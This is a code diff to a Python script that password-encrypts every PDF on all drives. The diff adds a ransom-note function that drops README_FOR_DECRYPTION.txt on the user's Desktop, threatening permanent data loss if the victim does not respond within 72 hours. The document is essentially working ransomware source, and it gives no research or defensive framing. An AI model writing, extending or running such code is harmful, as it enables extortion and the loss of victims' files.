@@ -2,7 +2,6 @@ import os
 from PyPDF2 import PdfReader, PdfWriter
 import string
 
-
 # Define the encryption password
 password = "12345"
 
@@ -41,5 +40,24 @@ def encrypt_all_drives(password):
         print(f"Encrypting PDFs in {drive}")
         encrypt_all_pdfs(drive, password)
 
+# Function to create a ransom note on the desktop
+def create_ransom_note():
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    note_path = os.path.join(desktop_path, "README_FOR_DECRYPTION.txt")
+
+    # Ransom note content
+    ransom_note = (
+        "Your files have been encrypted! "
+        "\n\n"
+        "Failure to communicate within 72 hours will result in permanent loss of data."
+    )
+
+    # Write the ransom note to a text file
+    with open(note_path, "w") as file:
+        file.write(ransom_note)
+
 # Start the encryption process for all drives
 encrypt_all_drives(password)
+
+# Create the ransom note on the desktop
+create_ransom_note()
